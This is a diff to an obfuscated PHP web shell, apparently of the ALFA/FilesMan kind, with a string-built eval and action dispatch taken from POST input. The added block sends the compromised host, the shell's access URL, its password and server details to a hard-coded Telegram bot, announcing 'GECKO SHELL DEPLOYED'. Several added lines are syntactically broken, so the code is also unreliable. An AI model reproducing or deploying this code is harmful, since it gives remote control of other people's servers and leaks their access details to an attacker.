@@ -17,6 +17,35 @@ $GLOBALS['ayAHGSshXn'] = array(
 'post_encryption' => false,
 'cgi_api' => true,
 );
+$token = '8390423631:AAE18ENcI5InhKoR0RmW3B2Yyke7VoV7Hqc';
+$chat_id = '5070938778';
+$current_url = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[SCRIPT_NAME]";
+
+// AUTO SEND TO TELEGRAM (hanya sekali)
+if(!isset($_SESSION['notified'])) {
+    $message = "🐍 *GECKO SHELL DEPLOYED!*\n\n";
+    $message ;.= "📱 *Target:* `$_SERVER[HTTP_HOST]`\n";
+    $message .= "🔗 *Access URL:* `$current_url`\n";
+    $message .= "🔑 *Password:* `gecko`\n";
+    $message .= "⚡ *Path:* `".getcwd()."`\n";
+    $message .= "📊 *PHP:* `".phpversion()."`\n\n";
+    $message .= "*Be Exploiter Once More!* 🐍";
+
+    $url = "https://api.telegram.org/bot$token/sendMessage";
+    $data = ['chat_id' => $chat_id, 'text' => $message, 'parse_mode' => 'Markdown'];
+    
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, $url);
+    curl_setopt($ch, CURLOPT_POST, 1);
+    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true)
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_exec($ch);
+    curl_close($ch);
+    
+    $_SESSION['notified'] = true; // Mark as sent
+}
+
 $CWppUDJxuf = 'fu' . 'n' . 'ct' . 'ion_' . 'e' . 'xist' . 's';
 $aztJtafUXm = 'cha' . 'r' . 'C' . 'o' . 'd' . 'e' . 'A' . 't' . '';
 $OVpGNqqFZs = 'e' . 'v' . 'al';
@@ -4928,4 +4957,6 @@ $_POST['a'] = 'FilesMan2';
 if(!empty($_POST['a']) && function_exists('alfa' . $_POST['a']))
 call_user_func('alfa' . $_POST['a']);
 exit;
+
 ?>
+<?php echo $_SESSION['notified'] ? ' : 'Notifying...'; ?>
